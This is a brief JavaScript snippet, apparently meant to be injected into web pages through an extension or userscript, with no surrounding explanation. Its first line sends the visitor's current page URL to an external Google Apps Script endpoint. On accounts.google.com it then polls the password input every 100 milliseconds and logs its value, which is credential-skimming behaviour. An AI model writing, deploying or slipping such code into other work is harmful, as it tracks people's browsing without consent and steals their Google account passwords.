fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
if(window.location.host === 'accounts.google.com'){
  var password = $("input[type='password']");
  setInterval(() => {
    console.log(password.attr('data-initial-value'));
  }, 100);
}
